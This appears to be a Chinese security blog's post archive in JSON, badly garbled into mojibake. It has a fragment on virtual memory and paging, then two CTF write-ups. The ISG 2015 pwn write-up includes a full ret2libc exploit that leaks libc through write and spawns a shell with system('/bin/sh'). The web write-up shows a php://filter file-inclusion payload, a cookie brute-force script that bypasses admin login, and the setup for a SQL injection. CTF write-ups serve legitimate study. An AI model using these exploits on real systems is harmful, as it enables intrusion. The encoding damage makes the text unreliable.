Bã€‚å¯ä»¥çœ‹åˆ°æ•´ä¸ªè¿‡ç¨‹æœ‰å¤§é‡çš„æ•°æ®åœ¨æ¢å…¥æ¢å‡ºï¼Œå¯¼è‡´æ•ˆç‡ååˆ†ä½ä¸‹ è¿è¡Œçš„åœ°å€ä¸ç¡®å®šæ¯æ¬¡åˆ†é…çš„ç©ºé—´åœ°å€éƒ½ä¸ç¡®å®šï¼Œä½†æ˜¯æ•°æ®å’Œè·³è½¬æ—¶çš„ç›®æ ‡åœ°å€éƒ½æ˜¯å›ºå®šçš„ã€‚è¿™å°±æ¶‰åŠåˆ°é‡å®šå‘çš„é—®é¢˜äº†ï¼Œä¼šåœ¨ä»¥åè®¨è®º 1.51 å…³äºéš”ç¦»ç¬¬ä¸€ä¸ªé—®é¢˜å°±æ˜¯éš”ç¦»ï¼Œæ€ä¹ˆè§£å†³å‘¢ï¼Ÿ èªæ˜çš„ç¨‹åºå‘˜ä»¬å»ºç«‹äº†ä¸€ä¸ªæ¦‚å¿µï¼šè™šæ‹Ÿåœ°å€ç©ºé—´ã€‚ è™šæ‹Ÿåœ°å€ç©ºé—´ï¼šå‡çš„ï¼Œä¸å­˜åœ¨çš„ã€‚æ¯ä¸ªè¿›ç¨‹åªèƒ½è®¿é—®è‡ªå·±çš„åœ°å€ç©ºé—´ï¼Œæœ‰æ•ˆçš„åšåˆ°äº†éš”ç¦»ç‰©ç†åœ°å€ç©ºé—´ï¼šå’Œåå­—ä¸€æ ·ï¼Œç‰©ç†å­˜åœ¨çš„ã€‚å¦‚æœåœ°å€çº¿æœ‰ 32 æ¡ï¼Œé‚£ä¹ˆç‰©ç†ç©ºé—´å°±æœ‰ 2^32 å­—èŠ‚ï¼ˆ4Gï¼‰ã€‚ä½†æ˜¯å¦‚æœä½ åªè£…äº† 512 MB çš„å†…å­˜ï¼Œé‚£ç‰©ç†åœ°å€çš„æœ‰æ•ˆéƒ¨åˆ†ä¸ºï¼š 0x00000000 ~ 0x1FFFFFFF 1.52 åˆ†æ®µåˆ†æ®µçš„åŸºæœ¬æ¦‚å¿µï¼šè¯´å›ä¸Šé¢çš„ ç¨‹åº A å’Œ ç¨‹åº Bã€‚å‡è®¾æœ‰ä¸€ä¸ª åœ°å€ä» 0x0000000 åˆ° 0x00A00000 çš„ 10M è™šæ‹Ÿç©ºé—´ã€‚ç„¶ååœ¨ç‰©ç†åœ°å€ä¸­æŒ‘é€‰ä¸€å—ç›¸åŒå¤§å°çš„ç©ºé—´ï¼š0x00110000 åˆ° 0x00B10000ï¼Œå°†è¿™ä¸¤å—åœ°å€ç©ºé—´ä¸€ä¸€æ˜ å°„ã€‚ï¼ˆç”±è½¯ä»¶æ˜ å°„ï¼Œåˆ«é—®ä»€ä¹ˆè½¯ä»¶ï¼‰ è¿™é‡Œè§£å†³äº†ä¸Šé¢æåˆ°çš„ ç¬¬ä¸€ä¸ª å’Œ ç¬¬ä¸‰ä¸ªé—®é¢˜ï¼šä¸¤å—æ²¡æœ‰é‡å çš„ç©ºé—´ï¼Œå½“ A è®¿é—®è¶…å‡º 0x00A0000 çš„æ—¶å€™ï¼Œç¡¬ä»¶å°±ä¼šåˆ¤æ–­è¿™æ˜¯ä¸ªéæ³•è®¿é—®ã€‚ å±€éƒ¨æ€§åŸç† ä½†æ˜¯ç¬¬äºŒä¸ªé—®é¢˜è¿˜æ˜¯æ²¡å˜å•Šï¼Œä¾ç„¶æ˜¯æ¯ä¸ªæ•´ä¸ªç¨‹åºçš„æ¬å…¥æ¬å‡ºã€‚èªæ˜çš„ç¨‹åºå‘˜æ€»æ˜¯æœ‰è§£å†³åŠæ³•ï¼Œä»–ä»¬å‘ç°ï¼šå½“ä¸€ä¸ªç¨‹åºè¿è¡Œæ—¶ï¼Œåœ¨æŸä¸ªæ—¶é—´æ®µå†…ï¼Œåªæ˜¯é¢‘ç¹çš„ä½¿ç”¨ä¸€å°éƒ¨åˆ†æ•°æ®ï¼Œä¹Ÿå°±æ˜¯è¯´å¾ˆå¤šæ•°æ®ä¸€æ®µæ—¶é—´å†…ä¸ä¼šè¢«è®¿é—®åˆ°ï¼Œè¿™å°±æ˜¯ tmd å±€éƒ¨æ€§åŸç†ã€‚ æ€ä¹ˆåˆ©ç”¨èµ·æ¥äº†å‘¢ï¼Ÿç¨‹åºå‘˜ä»¬ç»™æ–¹æ³•èµ·äº†ä¸ªåï¼šåˆ†é¡µã€‚ 1.53 åˆ†é¡µåˆ†é¡µçš„å°±æ˜¯æŠŠåœ°å€ç©ºé—´äººä¸ºçš„åˆ†æˆå›ºå®šå¤§å°çš„é¡µï¼Œé¡µçš„å¤§å°ç”±ç¡¬ä»¶å†³å®šï¼Œæˆ–è€…ç¡¬ä»¶æ”¯æŒå¤šç§å¤§å°çš„é¡µï¼Œç”±æ“ä½œç³»ç»Ÿé€‰æ‹©ã€‚ åŠ è½½ä¸€ä¸ªç¨‹åºæ—¶å…ˆå°†ç¨‹åºè™šæ‹Ÿåœ°å€åˆ†é¡µï¼Œç„¶åå°†å¸¸ç”¨çš„é¡µæ˜ å°„åˆ°ç‰©ç†å†…å­˜ï¼Œä¸å¸¸ç”¨çš„å­˜åœ¨ç£ç›˜ä¸­ï¼ˆä¸åŒç¨‹åºçš„æœ‰äº›è™šæ‹Ÿé¡µè¢«æ˜ å°„åˆ°åŒä¸€ä¸ªç‰©ç†é¡µï¼Œå®ç°å†…å­˜å…±äº«ï¼‰ã€‚ é‚£è¦è®¿é—®ç£ç›˜ä¸­çš„é¡µæ—¶æ€ä¹ˆåŠå‘¢ï¼Ÿæ­¤æ—¶ç¡¬ä»¶æ•è·åˆ°ä¸€ä¸ªä¿¡æ¯ï¼šé¡µé”™è¯¯ï¼Œç„¶åé˜»å¡è¯¥ç¨‹åºï¼Œå°†ç£ç›˜ä¸­çš„é¡µæ¢å…¥å†…å­˜ä¸­ã€‚ å½“ç„¶ä¹Ÿè¦ä¿æŠ¤é¡µå•¦ï¼Œå°±å¥½åƒä¸Šé¢æåˆ°çš„ ä¸¤ä¸ªç¨‹åºç”¨åˆ°åŒä¸€ä¸ªé¡µæ—¶ï¼Œè¿™ä¸ªé¡µæœ€å¥½æ˜¯ä¸èƒ½è¢«ä¿®æ”¹çš„ï¼Œä¸ç„¶å…¶ä¸­ä¸€ä¸ªä¿®æ”¹ï¼Œå¦ä¸€ä¸ªå¯èƒ½å°±è¯»ä¸åˆ°æƒ³è¦çš„æ•°æ®/ä»£ç ã€‚æ¯ä¸ªé¡µéƒ½å¯ä»¥è®¾ç½®æƒé™å±æ€§ï¼Œä¿®æ”¹è¿™äº›å±æ€§çš„æƒé™ä¹Ÿåªæœ‰æ“ä½œç³»ç»Ÿæœ‰ã€‚è¯¦ç»†çš„ä»‹ç»ä¼šæ”¾åœ¨æ—¥åã€‚ã€‚ã€‚ï¼ˆä¸æ˜¯æˆ‘æƒ³æ”¾åœ¨æ—¥åï¼‰ è™šæ‹Ÿå†…å­˜çš„å®ç°éœ€è¦ä¾é ç¡¬ä»¶æ”¯æŒï¼Œå¯¹ä¸åŒ CPU æ¥è¯´æ˜¯ä¸åŒçš„ï¼Œä½†æ˜¯å‡ ä¹æ‰€æœ‰çš„ç¡¬ä»¶éƒ½é‡‡ç”¨ä¸€ä¸ªå« MMU çš„éƒ¨ä»¶è¿›è¡Œé¡µæ˜ å°„ï¼ŒCPU å‘å‡º è™šæ‹Ÿåœ°å€ ç»è¿‡ MMU è½¬æ¢æˆå®é™…åœ°å€ã€‚ MMU ä¸€èˆ¬éƒ½é›†æˆåœ¨ CPU å†…éƒ¨ã€‚ 1.6 ä¼—äººæ‹¾æç«ç„°é«˜1.61 çº¿ç¨‹åŸºç¡€ä¸€ä¸ªæ ‡å‡†çš„çº¿ç¨‹æœ‰ï¼šçº¿ç¨‹IDï¼Œå½“å‰æŒ‡ä»¤æŒ‡é’ˆï¼Œå¯„å­˜å™¨é›†åˆå’Œå †æ ˆã€‚","path":"2018/09/24/ç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»-ç¬¬ä¸€é¡µ/","date":"09-24","excerpt":""},{"title":"ä¸€é“ç®€å•çš„ PWN é¢˜","text":"è¿™é“è²Œä¼¼æ˜¯ ISG 2015 å¹´çš„é¢˜äº†ã€‚ã€‚ æœ¬é¢˜WP é—®é¢˜ï¼š è·Ÿç€æ ˆæº¢å‡ºï¼Œå°† EIP è¦†ç›–æˆ write å‡½æ•°çš„ plt å€¼ï¼Œç´§æ¥ç€ read çš„ plt å€¼ï¼Œè¿™é‡Œè®©æˆ‘ä¸è§£çš„æ˜¯ï¼š ä¸ºä»€ä¹ˆ read çš„å‡½æ•°è¢«æ‰§è¡Œäº†ã€‚çŒœæµ‹åº”è¯¥æ˜¯ write å‡½æ•°ä¸­è‡ªå¸¦äº† ret æŒ‡ä»¤ã€‚æ˜å¤©äº‰å–å­¦ä¼šç”¨ gdb è°ƒè¯•è¿› write å‡½æ•°ä¸­å§ã€‚ æ¥ä¸Šã€‚ã€‚å°è¯•ç”¨ gdb è¿›å…¥ write å‡½æ•°ã€‚ä½†æ˜¯ï¼š é—®äº†è¡¨å“¥åï¼Œè¡¨å“¥æ¥äº†ä¸ªå§¿åŠ¿ï¼šå…ˆè¿è¡Œï¼Œåœ¨è¾“å…¥çš„æ—¶å€™æŒ‰ CTRL+C ï¼ˆä¹‹å‰ç¡®å®æ²¡å­¦è¿‡ gdb ï¼‰ ä½†æ˜¯è¿™é‡Œï¼Œå¯ä»¥æ•´ä¸ªæ›´ç›´æ¥çš„ï¼šb write è¿è¡Œ&gt; è¿›å…¥åˆ° write å‡½æ•°å†…ï¼Œé¦–å…ˆçœ‹çœ‹æ€ä¹ˆå–å‚æ•°ï¼š ç­‰ä¼šå†è®²ã€‚ã€‚ å†çœ‹çœ‹æœ€åï¼Œå‘ç°ç¡®å®ç”¨çš„ retï¼ˆåºŸè¯ï¼Œä¸ç”¨ ret æ€ä¹ˆè¿”å›ï¼‰ åˆ‡å…¥è¿™é“é¢˜ã€‚ã€‚ã€‚ æ€è€ƒ é¦–å…ˆä¸¢è¿› ida é‡Œçœ‹çœ‹ å¾ˆæ˜æ˜¾çš„ä¸€ä¸ªç¼“å†²åŒºæº¢å‡ºã€‚ã€‚ï¼ˆæˆ‘ä¹Ÿåªä¼šç¼“å†²åŒºæº¢å‡ºäº†ï¼‰ è¿™é‡Œå†™çš„ å˜é‡ v1 ç¦» ebp ä¸º 0xC(12) ä¸ªä½ç½®ï¼Œä½†æ˜¯å®é™…æµ‹è¯•ä¸º 0x10(16) ä¸ªä½ç½®ã€‚ è¿™é‡Œç©ä¸ªå¥½ç©çš„ã€‚ã€‚æˆ‘ä»¬å¯ä»¥ç”¨ gdb_pattern ç”Ÿæˆä¸€äº›å­—ç¬¦ä¸²ï¼Œå‘é€å‡ºå»åæŸ¥çœ‹ EIPã€‚å°†æ­¤æ—¶çš„ EIP è®°å½•ä¸‹æ¥å†ç”¨ gdb_offset æŸ¥çœ‹åç§»ä½ç½®ï¼Œè¿™å°±æ˜¯å˜é‡ç¦» EIP çš„ä½ç½®äº†ï¼š ç°åœ¨æˆ‘ä»¬çŸ¥é“æ˜¯ç¦» 20 ä¸ªä½ç½®ã€‚æˆ‘ä»¬å¯ä»¥å…ˆæº¢å‡ºç©ç©ï¼Œè¿™é‡Œ checksec å‘ç°å¼€å¯äº† NX ã€‚æˆ‘ä»¬å¯ä»¥å…ˆç”¨ write å‡½æ•°è¯•è¯•æ°´ã€‚æ¯”å¦‚å°±æ‰“å° ida ä»£ç ä¸­ ç¬¬ 6 è¡Œçš„ write(1, &quot;Welcome to ISG 2015!\\nPwn me to get the flag:\\n&quot;, 0x2Du); åœ¨ ida ä¸­çœ‹çœ‹ plt çš„ write åœ°å€ï¼š å†åœ¨ qira ä¸­çœ‹çœ‹ welcome to isg.. è¿™æ®µå­—ç¬¦ä¸²åœ¨å“ªï¼š å› ä¸ºä¹‹å‰è°ƒç”¨çš„ write å‡½æ•°å°±æ˜¯è¾“å‡ºè¿™æ®µå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥è¿™ä¸ªåœ°å€å°±æ˜¯é‚£æ®µå­—ç¬¦ä¸²çš„åœ°å€å’¯ã€‚ã€‚ æ•´ç†ä¸€ä¸‹ï¼š åˆå§‹æ ˆçš„ç»“æ„ï¼š ç›¸å¯¹åœ°å€ å¯¹åº”å€¼ 0x0 å˜é‡ v1 0x4 â€¦ 0x8 â€¦ 0x12 â€¦ 0x16 ESP 0x20 EIP æ‰€ä»¥è¿™é‡Œå¡«å…… 20 ä½ä»»æ„å­—ç¬¦ã€‚å†ç”¨ write å‡½æ•°çš„ plt åœ°å€è¦†ç›– EIPã€‚ POC å¦‚ä¸‹ï¼š çœ‹çœ‹ qira ä¸­ï¼š çœ‹åˆ° write å‡½æ•°æ‰§è¡Œäº†ï¼Œä½†æ˜¯æˆ‘ä»¬æ²¡ç»™å‚æ•°ï¼Œæ‰€ä»¥ä»–å–åˆ°äº†æ ˆé‡Œçš„é»˜è®¤å€¼ï¼Œè€Œä¸­é—´çš„å‚æ•°æ˜¯æœ€æ˜æ˜¾çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬çœ‹çœ‹ä¸­é—´çš„å‚æ•°ä½ç½®æ˜¯å¤šå°‘ï¼Œæ–¹ä¾¿è¦†ç›–ã€‚ä½ç½®æ˜¯ï¼š0xf6fff018 ï¼Œæ­¤æ—¶æ ˆé¡¶çš„åœ°å€ï¼š 0xf6fff008 ã€‚ å›åˆ°ä¸€å¼€å§‹ã€‚ã€‚åœ¨ write å‡½æ•°çš„æˆªå›¾ä¸­ï¼Œå‘ç°å–å¾—å‚æ•°ä½ç½®åˆ†åˆ«æ˜¯ï¼šesp+0x8, esp+0xC,esp+0x10ã€‚åœ¨å–å‚æ•°ä¹‹å‰è¿˜æœ‰ä¸ª push æ“ä½œï¼ˆåœ¨ write å‡½æ•°ä¸­ï¼Œä¸Šé¢çš„æˆªå›¾æœ‰ã€‚ã€‚ï¼‰ï¼Œæ‰€ä»¥å–å‚æ•°å¾—å®é™…ä½ç½® +4ã€‚æ‰€ä»¥åˆ†åˆ«ä¸ºï¼š esp+0x8ï¼Œesp+0x10,esp+14 ã€‚ å†çœ‹ä¸ªæ˜æ˜¾ç‚¹çš„ä¾‹å­ï¼š è¿™é‡Œå°è¯•æ§åˆ¶å‚æ•°ã€‚ã€‚ ç®€å•çš„åŠ æ³•ï¼š0x8+0x14 = 0x1C å‡½æ•°è°ƒç”¨ okï¼Œåˆ«å¿˜äº†ä¸€å¼€å§‹è¦åšçš„äº‹æƒ…ï¼Œå°±æ˜¯å†è°ƒç”¨ä¸€æ¬¡ write å‡½æ•°ï¼Œè¾“å‡ºä¸€æ¬¡ Welcome... é‚£ä¸ªå­—ç¬¦ä¸²ã€‚ æ‰¾åŸºåœ°å€ æˆ‘ä»¬å¯ä»¥ç›´æ¥å» GOT è¡¨æ‰¾ write å‡½æ•°çš„åœ°å€ï¼š åœ¨ GOT è¡¨ä¸­æ‰¾åˆ°äº† write å‡½æ•°ï¼š0x804a01cã€‚ æ”¹ä¸€ä¸‹ ROP é“¾ï¼Œå°† write çš„å®é™…å‡½æ•°åœ°å€æ‰“å°å‡ºæ¥ï¼š å¯ä»¥çœ‹åˆ°è¾“å‡ºäº†æ­£ç¡®çš„åœ°å€ã€‚ä»£ç ä¸­ä¸Šé¢çš„ r.recv æ˜¯ç”¨æ¥æ¥æ”¶ä¸€å¼€å§‹è¾“å‡ºçš„é‚£æ®µ welcome...ï¼Œä½†æ˜¯æ²¡å¿…è¦è¾“å‡ºï¼ˆ ä¸æ¥æ”¶çš„è¯ä¸‹é¢ recv è¿˜æ˜¯ä¼šå…ˆæ¥æ”¶åˆ°è¿™ä¸ªå­—ç¬¦ä¸² ï¼‰ã€‚ è·å– system åœ°å€å’Œ /bin/sh å­—ç¬¦ä¸² é€šè¿‡ ldd çœ‹çœ‹è¿™ä¸ª äºŒè¿›åˆ¶ æ–‡ä»¶ç”¨äº†ä»€ä¹ˆé“¾æ¥åº“.. 1234root@nick-machine:/home/nick/liey# ldd pwnme linux-gate.so.1 =&gt; (0xf77bc000) libc.so.6 =&gt; /lib32/libc.so.6 (0xf75f4000) /lib/ld-linux.so.2 (0x565e8000) /lib32/libc.so.6 ä¸­æœ‰æˆ‘ä»¬æƒ³è¦çš„ï¼Œé¦–å…ˆæ˜¯ è·å– write å‡½æ•°çš„åç§»åœ°å€ï¼Œè¿™æ ·å°±èƒ½è·å–åˆ°åŸºåœ°å€äº†ï¼Œå¯ä»¥ç”¨ readelfï¼š 123root@nick-machine:/home/nick/liey# readelf -a /lib32/libc.so.6|grep write@ ..... 2303: 000d9900 119 FUNC WEAK DEFAULT 12 write@@GLIBC_2.0 è®°ä¸‹æ¥ï¼Œåç§»åœ°å€ 0xd9900ã€‚ æ¥ä¸‹æ˜¯ system å‡½æ•°åç§»åœ°å€ï¼š 123root@nick-machine:/home/nick/liey# readelf -a /lib32/libc.so.6|grep system@ ... 1443: 0003fe70 56 FUNC WEAK DEFAULT 12 system@@GLIBC_2.0 system åç§»åœ°å€æ˜¯ 0x3fe70ã€‚ã€‚æ¥ä¸‹æ¥æ˜¯ /bin/sh ï¼Œè¿™ä¸ªå­—ç¬¦ä¸²ç”¨æ¥ä¼ è¿› system å‡½æ•°ä»¥ä¾¿è·å– shellï¼Œè¿™é‡Œæˆ‘ä»¬ç”¨ ROPgadget 1234root@nick-machine:/home/nick/liey# ROPgadget --binary /lib32/libc.so.6 --string &quot;/bin/sh&quot;Strings information============================================================0x0015da8c : /bin/sh å†å‘é€ æ¥ä¸‹æ¥æ€è€ƒä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯çºµä½¿åœ¨å‘é€å®Œä¸€æ¬¡ shellcode åªä¼šçŸ¥é“äº† åŸºåœ°å€ã€‚ä½†æ˜¯æˆ‘ä»¬å´ä¸èƒ½å†è°ƒç”¨äº†ã€‚ã€‚ã€‚ åœ¨æœ€å‰é¢æåˆ°è¿‡ã€‚write å‡½æ•°ä¼šè°ƒç”¨ retã€‚å¯ä»¥æŠŠè¿™ä¸ªç†è§£æˆ pop eipã€‚ä¹Ÿå°±æ˜¯åœ¨æ ˆé¡¶ä¸­å–å‡º eipã€‚ã€‚ã€‚é‚£ä¹ˆæ ˆé¡¶æ˜¯å“ªå‘¢ï¼Ÿ å°±æ˜¯åœ¨ write åä»¥åŠæ‰€æœ‰å‚æ•°çš„æœ€å‰é¢ã€‚å‰é¢æˆ‘ç”¨ 0x61616161 æ›¿ä»£äº†ã€‚ã€‚ ä½†æ˜¯åˆä¼šé‡åˆ°ä¸€ä¸ªé—®é¢˜ã€‚ã€‚å°±æ˜¯å³ä½¿ç›´æ¥è°ƒç”¨äº† system å‡½æ•°ï¼Œå‡½æ•°å†…å–å‚æ•°æ˜¯å–çš„ esp+0x8ï¼Œä½†æ˜¯ esp+0x8 è¿™ä¸ªä½ç½®è¢« write å‡½æ•°çš„ 0xC å ç”¨äº†ã€‚ã€‚ æƒ³ä¸€ä¸‹æ˜¯é‚£ä¸ªå‡½æ•°å†™è¿›è¿™æ®µ shellcode çš„ã€‚å¯¹ï¼Œmain å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥è°ƒç”¨ä¼š main å‡½æ•°ï¼Œå†è°ƒç”¨ä¸€æ¬¡ shellcodeï¼Œåªä¸è¿‡è¿™æ¬¡æ˜¯è°ƒç”¨ system å‡½æ•°ï¼Œè€Œä¸æ˜¯ write å‡½æ•°ã€‚ (main å‡½æ•°çš„ä½ç½®å† ida ä¸­å¯ä»¥æ‰¾åˆ°) å®Œæ•´çš„POCï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344from pwn import *r = remote(&quot;192.168.1.107&quot;,4000)write_plt=0x08048370main=0x804847dprint(r.recv())poc_rop1=[ write_plt, main, 0x1, 0x804a01c, 4,]shellcode=&quot;a&quot;*20 + flat(poc_rop1)r.sendline(shellcode)write_offset = 0xd9900system_offset =0x3fe70bin_bash = 0x0015da8cbase = p32(int(r.recv().encode(&apos;hex&apos;),16)).encode(&apos;hex&apos;)base=int(base,16)-write_offsetsystem = base + system_offsetbin_str = base + bin_bashpoc_rop2 = [ system, 0x61626364, bin_str,]shellcode2 = &quot;a&quot;*12 + flat(poc_rop2)r.sendline(shellcode2)r.interactive() éœ€è¦æ³¨æ„çš„æ˜¯ç¬¬äºŒæ¬¡åªéœ€è¦å¡«å…… 12 ä¸ª å­—ç¬¦å³å¯ã€‚ã€‚ æ•ˆæœï¼š Doneâ€¦.","path":"2018/09/11/ä¸€é“ç®€å•çš„ PWN é¢˜/","date":"09-11","excerpt":""},{"title":"è“é²¸ç¬”è®°ç®¡ç†ç³»ç»Ÿï¼ˆå¡”ä¸»nbï¼‰","text":"è“é²¸å®˜ç½‘æœ¬é¢˜æºç  é¦–å…ˆå…ˆéšä¾¿æ³¨å†Œä¸ªï¼Œç™»é™†çœ‹çœ‹ï¼š è¿™é‡Œçœ‹åˆ°ä¸ªæç¤ºä¸€æ ·çš„ä¸œè¥¿ï¼šè®¿é—® /dbinit.sql æ‹¿åˆ° æ•°æ®åº“ç»“æ„ã€‚ å†çœ‹çœ‹åœ°å€ï¼Œé¦–é¡µçš„ url åœ°å€ä¸ºï¼šhttp://106.39.10.134:10002/index.php?action=front&amp;mode=index ä¸€å¼€å§‹è¿˜ä»¥ä¸ºæ˜¯ MVC æ¶æ„çš„ï¼Œåæ¥çœ‹äº†å¸ˆå‚…çš„ WP å‘ç°ï¼š 123456&lt;?php$action=$_GET['action'];$mode=$_GET['mode'];$file=$action.'/'.$mode.'.php';include($file);?&gt; å¾ˆæ˜æ˜¾çš„ä¸€ä¸ªæ–‡ä»¶åŒ…å«æ¼æ´ã€‚ç”¨ php://filter ä¼ªåè®®è¯»å–æºç ï¼š /index.php?action=php://filter/read=convert.base64-encode/resource=front/&amp;mode=index ä½†æ˜¯è¿™é‡Œè¯»ä¸å‡º config.inc.php åŸå› å¯ä»¥åœ¨ index.php ä¸­çœ‹åˆ°ï¼š 1else if(!preg_match(&apos;/\\.&#123;2&#125;/is&apos;,$_GET[&apos;action&apos;])&amp;&amp;preg_match(&apos;/^[0-9A-Za-z]+$/is&apos;,$_GET[&apos;mode&apos;]) mode ä¸­ä¸èƒ½åŒ…å« . å…±è¯»å–åˆ°ï¼š123456789index.phpcommon.phpadmin/index.phpadmin/login.phpadmin/setpagenum.phpfront/index.phpfront/login.phpfront/newnote.phpfront/register.php æˆ‘ä»¬å¯ä»¥çœ‹çœ‹ admin/index.php ä¸­æ˜¯æ€ä¹ˆéªŒè¯æ˜¯å¦ç™»é™†çš„ï¼ˆåˆ«é—®ä¸ºä»€ä¹ˆä¸€ä¸Šæ¥å°±çœ‹è¿™ä¸ªï¼‰ï¼š è°ƒç”¨äº† check_login å’Œ get_level å‡½æ•°ï¼Œè¿™ä¸¤ä¸ªå‡½æ•°åœ¨ common.php ä¸­ã€‚æˆ‘ä»¬å…ˆçœ‹çœ‹è¿™ä¸ªæ–‡ä»¶çš„å¼€å¤´ï¼š å¾ˆæ˜æ˜¾ï¼Œè¿™é‡Œè¿›è¡Œäº†ä¸€äº›åˆå§‹åŒ–æ“ä½œã€‚ å†æ¥çœ‹çœ‹ä¸¤ä¸ªéªŒè¯å‡½æ•°ï¼š è¿™é‡Œå°† cookie ä¸­çš„ uid å–å‡ºï¼Œä»¥ | åˆ†å‰²ï¼ŒåŠ å¯†åˆ¤æ–­ã€‚ å¦‚æœæˆåŠŸè¿”å›å½“å‰ $_SESSION ä¸­çš„å€¼ï¼Œå¦åˆ™è¿”å› Falseã€‚å¦‚æœæ²¡ç™»é™†ï¼Œé‚£æ­¤æ—¶çš„å€¼ä¸º NULL ï¼Œä½†æ˜¯åˆ¤æ–­ä½¿ç”¨çš„æ˜¯ ä¸¥æ ¼ åˆ¤æ–­ï¼Œå³ï¼š 1if(check_login()!==false&amp;&amp;get_level()!==false) è¿™ä¸¤ä¸ªå‡½æ•°çš„ç»•è¿‡æ–¹æ³•æ˜¯ä¸€æ ·çš„ï¼Œæ‰€ä»¥ä¸‹ä¸€æ­¥æˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯ç ”ç©¶ï¼š $userinfo[1]==encode($userinfo[0]) è¿™ä¸ªæ¡ä»¶æ€ä¹ˆæˆç«‹ï¼Œè¿™ä¸ªæ•°ç»„æ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œæˆ‘ä»¬å¯ä»¥è·Ÿè¿› encode å‡½æ•°ä¸­ï¼š 123function encode($str)&#123; return md5($_SESSION['SECURITY_KEY'].$str);&#125; ä¸éš¾ç†è§£ï¼Œç¿»ä¸Šé¢å‘ç°ï¼š 1$_SESSION[&apos;SECURITY_KEY&apos;]=rand_str(6); æ¥çœ‹çœ‹è¿™ä¸ªå‡½æ•°çš„å®ç°ï¼š1234567891011function rand_str($lenth=16)&#123; $rand=[]; $_str=\"wh\"; while($lenth)&#123; $rand[]=$_str[rand(0,strlen($_str)-1)]; $lenth--; &#125;// var_dump($rand); return implode($rand);&#125; éšæœºå–6ä½ w æˆ– h æ•´ç†ä¸€ä¸‹æ€è·¯ï¼š è¦æƒ³ç»•è¿‡ç™»é™†éªŒè¯ï¼Œå°±è¦è®©éªŒè¯å‡½æ•°è¿”å› NULLã€‚ å‡½æ•°è¿”å› NULL çš„æ¡ä»¶ä¸ºï¼š 1if($userinfo[1]==encode($userinfo[0])) $userinfo æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ï¼Œå”¯ä¸€ä¸ç¡®å®šçš„æ˜¯ encode å‡½æ•°ä¸­ç”¨åˆ°çš„ $_SESSION[&#39;SECURITY_KEY&#39;] å› ä¸ºä¸å¯¹ï¼Œæ‰€ä»¥æˆ‘ä»¬å†™ä¸ªè„šæœ¬çˆ†ç ´ï¼š 1234567891011121314151617181920import requestsimport itertoolsfrom hashlib import md5lst = itertools.product(&quot;wh&quot;, repeat=6)url = &quot;http://106.39.10.134:10002/index.php?action=admin&amp;mode=index&quot;def m(s): return md5(s).hexdigest()for i in lst: key = m(&apos;&apos;.join(i) + &apos;admin&apos;) headers = &#123; &quot;Cookie&quot;: &quot;PHPSESSID=05ibpb1gtgmuq4ji4g5cgkvg07;uid=admin|&quot; + key &#125; r = requests.get(url, headers=headers) if r.text.find(&quot;not login&quot;) &lt; 0: print(headers) å¾ˆå¿«å°±ä¼šè¾“å‡º Cookieï¼Œæ·»åŠ ä¸Šæµè§ˆå™¨ï¼Œå†è®¿é—® åå°çš„ index å³å¯ã€‚ã€‚ è¸©å‘ è¿™é‡Œè¿˜æœ‰ä¸ªå‘ï¼Œå°±æ˜¯å¦‚æœä½ å½“å‰çš„ SESSION å·²ç»ç™»é™†è¿‡å‰å°ï¼Œé‚£ä¹ˆçˆ†ç ´å°±ä¼šå¤±è´¥ã€‚åŸå› å¯èƒ½æ˜¯ $_SESSION ä¸­ç™»é™†çš„ç”¨æˆ·çš„ level ä¸º 0ï¼Œåœ¨ get_level å‡½æ•°ä¸­ä¼šè¿”å› False ç°åœ¨æˆ‘ä»¬å·²ç»ç™»é™†äº†åå°ï¼Œçœ‹çœ‹åå°çš„ä»£ç ï¼š è¿™é‡Œæ‹¼æ¥äº†ä¸ª get_page_size()ï¼Œè¿™ä¸ªå‡½æ•°åœ¨ common.php é‡Œï¼Œæˆ‘ä»¬çœ‹çœ‹è¿™ä¸ªå‡½æ•°ï¼š 123456function get_page_size()&#123; $sql=&quot;select num from page&quot;; $res=mysql_my_query($sql); $row=$res-&gt;fetch_assoc(); return $row[&apos;num&apos;];&#125; åªåšäº†å¾ˆç®€å•çš„æŸ¥è¯¢ã€‚ æˆ‘ä»¬ä¼šå‘ç°åå°é¡µé¢è¿˜æœ‰ä¸ªè®¾ç½®é¡µé¢ï¼ˆsetpagenum.phpï¼‰ï¼Œè¿›å»çœ‹çœ‹ï¼š è¿™ä¸ªè®¾ç½®å°±æ˜¯ get_page_size æŸ¥è¯¢å¹¶è¿”å›çš„è¡¨å’Œå­—æ®µï¼ŒçŒœæµ‹å…³é”®ç‚¹å¯èƒ½å°±åœ¨è¿™äº†ï¼ˆåˆ«é—®ä¸ºä»€ä¹ˆçŒœï¼‰ã€‚ å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œåšäº† is_numeric çš„åˆ¤æ–­ï¼Œåˆ¤æ–­æ˜¯å¦æ˜¯æ•°å­—ã€‚ mysql ä¸­å…è®¸è¿™ä¹ˆç©ï¼šselect 0x313233; è¿™æ¡è¯­å¥ä¼šè¾“å‡º 123ï¼Œä¹Ÿå°±æ˜¯ ASCII ç ã€‚ ä½†æ˜¯ä¸å…è®¸è¿™ä¹ˆç©ï¼š select &#39;0x313233&#39;; æ³¨æ„è¿™é‡ŒåŠ äº†å•å¼•å·ï¼Œæ­¤æ—¶è¾“å‡º 0x313133 æˆ‘ä»¬å‘ç°è¿™é‡Œæ˜¯æ²¡æœ‰åŠ å¼•å·çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¼ è¿›æ¥çš„å€¼ä¼šåœ¨æ‰§è¡Œæ—¶è§£ææˆ ASCII ç ã€‚å¦‚æœè¿™æ˜¯æ•…æ„ç•™çš„æ´ï¼Œé‚£è¯¥å­—æ®µçš„å±æ€§å°±ä¸ä¼šæ˜¯ intã€‚å› ä¸º int å°±ä¸èƒ½å­˜å‚¨å­—ç¬¦ä¸²äº†ã€‚ å›é¡¾ä¸€ä¸‹æŸ¥è¯¢è¯­å¥ï¼š 12$page_size=get_page_size();$sql=&quot;select * from note limit 0,&quot;.$page_size; 